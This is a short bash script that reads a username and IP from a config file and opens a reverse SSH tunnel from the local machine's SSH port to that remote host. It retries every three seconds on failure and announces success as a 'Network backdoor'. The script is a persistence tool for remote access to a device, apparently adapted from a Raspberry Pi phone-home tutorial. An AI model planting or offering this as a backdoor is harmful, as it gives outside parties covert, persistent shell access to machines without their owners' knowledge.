#/bin/bash

warning="\033[1;31m"
title="\e[3;33m"
transparent="\e[0m"
green="\033[1;32m"

#-----source : https://www.tunnelsup.com/raspberry-pi-phoning-home-using-a-reverse-remote-ssh-tunnel/ ---

username=""
ip=""

createTunnel() {
    /usr/bin/ssh -N -R 2222:localhost:22  -i ~/.ssh/$username $username@$ip 
    if [[ $? -eq 0 ]]; then
    	echo -e $green Network backdoor created successfully $transparent
    else #if the connection failed. wait 3 sec and try again 
    	echo -e $warning $?
	echo -e connection failed.$transparent
    	sleep 3
	clear
    	createTunnel
    fi
}

info=($(cat ../../conf/current_ssh))
username=${info[0]}
ip=${info[1]}
/bin/pidof ssh
if [[ $? -ne 0 ]]; then
    echo -e $title Creating new tunnel connection...$transparent
    createTunnel
fi
